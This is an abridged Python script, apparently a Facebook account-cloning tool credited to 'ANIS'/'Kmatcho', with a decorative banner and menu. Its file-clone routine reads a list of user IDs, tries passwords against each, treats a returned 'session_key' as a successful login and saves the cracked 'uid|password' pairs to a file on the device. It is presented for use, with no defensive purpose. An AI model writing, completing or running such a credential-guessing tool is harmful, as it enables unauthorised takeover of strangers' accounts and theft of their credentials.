...
logo=f"""
    ...
    \033[38;5;46m$$ |      $$ |  $$ |$$ |  $$ |
    \033[38;5;46m$$$$$$$$\ \$$$$$$  |$$$$$$$  |
    \033[38;5;46m\________| \______/ \_______/                                                                                                                                                           
\033[1;99m==============================================================================
\033[1;32m[✓]AUTHOR  :\033[1;32m ANIS
\033[1;32m[✓]TOOL    :\033[1;32m NEW 
\033[1;32m[✓]FACEBOOK:\033[1;32m Qxɇ.KMATCHO.䄟ꜝཬྀ
\033[1;32m[✓]VERSION :\033[1;32m 1
...
def main():
    logox()
    print("  [1] FILE CLONE  |  [0] EXIT TOOL")
    print(cox)
    want=input("  [✓] INPUT+>")
    if want in ["A","a","1","01"]:
        file_iclone()
...
def file_iclone():
    print(cox)
    fl=input("  [✓]\033[37;5;46m File Path:")
    print(cox)
    try:
...
def auto_pass(fileeee):
    ...
    print(cox)
    print("  [✓] Id Save: /sdcard/Kmatcho.txt")
    print(cox)
...
def file_subb(uid,pwx):
    global oks,loop
    sys.stdout.write(f"\r  \033[38;5;46m[Kmatcho] {loop}|{str(len(oks))}");sys.stdout.flush()
    ...
    try:
        for ps in pwx:
            ...
            if "session_key" in q:
                ...
                open("/sdcard/EUR-Ok.txt","a").write(uid+"|"+ps+"\n")
                oks.append(uid)
                break
